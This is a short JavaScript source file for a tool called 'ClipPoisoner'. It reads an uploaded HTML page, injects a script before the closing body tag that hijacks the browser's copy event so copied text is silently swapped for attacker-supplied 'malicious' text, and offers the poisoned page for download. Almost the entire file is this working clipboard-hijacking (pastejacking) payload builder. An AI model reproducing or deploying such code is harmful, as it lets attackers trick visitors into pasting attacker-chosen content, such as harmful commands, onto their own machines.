// JavaScript File for ClipPoisoner
// Author - WireBits

function handleFileSelect(event){
    var file = event.target.files[0];
    var reader = new FileReader();
    reader.onload = function(event) {
        document.getElementById('htmlArea').value = event.target.result;
    };
    reader.readAsText(file);
}

function triggerFileInput(){
    document.getElementById('fileInput').click();
}

function injectAndDownload(){
    var htmlContent = document.getElementById('htmlArea').value;
    var maliciousText = document.getElementById('maliciousArea').value;
    
    var script = `
        <script>
            document.addEventListener('copy', function(e) {
                e.clipboardData.setData('text/plain', '${maliciousText}');
                e.preventDefault();
            });
        </script>
    `;
    
    var modifiedHtmlContent = htmlContent.replace(/<\/body>/, script + '</body>');

    var blob = new Blob([modifiedHtmlContent], { type: 'text/html' });
    var url = URL.createObjectURL(blob);

    var a = document.createElement('a');
    a.href = url;
    a.download = 'InjectedContent.html';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);

    URL.revokeObjectURL(url);
}
		
function resetTextArea(){
    document.getElementById("htmlArea").value = '';
    document.getElementById("maliciousArea").value = '';
}